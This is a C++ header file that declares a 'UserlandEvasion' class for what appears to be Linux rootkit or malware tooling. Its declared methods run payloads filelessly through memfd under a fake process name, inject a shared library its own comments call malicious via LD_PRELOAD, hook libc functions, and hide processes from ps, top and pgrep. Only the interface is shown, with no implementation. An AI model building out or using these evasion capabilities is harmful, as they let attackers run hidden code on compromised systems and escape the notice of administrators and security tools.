#pragma once

#include "common.h"
#include <string>
#include <vector>

namespace kernel_evasion {

class UserlandEvasion {
public:
    UserlandEvasion();
    ~UserlandEvasion();

    // Setup fileless execution using memfd + execveat
    // Payload loaded into anonymous memory, no disk file created
    Result<pid_t> execute_fileless(const std::string& payload_path,
                                   const std::vector<std::string>& args,
                                   const std::string& fake_name = "");

    // Setup LD_PRELOAD hijacking
    // Inject malicious shared library to intercept libc calls
    ErrorCode setup_ld_preload(const std::string& preload_lib_path,
                              const std::vector<std::string>& target_binaries = {});

    // Execute with LD_PRELOAD environment variable set
    Result<pid_t> execute_with_preload(const std::string& binary_path,
                                       const std::string& preload_lib_path,
                                       const std::vector<std::string>& args = {});

    // Hide process from userland tools (ps, top, pgrep)
    // Uses combination of metadata rewriting + syscall hooking
    ErrorCode hide_from_userland(pid_t pid);

    // Intercept libc functions for process hiding
    // Methods: getpwuid, getgrnam, readdir filtering
    ErrorCode setup_libc_interception(const std::string& hook_lib_path);

private:
    std::vector<pid_t> fileless_processes_;
    std::string active_preload_lib_;
};

}  // namespace kernel_evasion
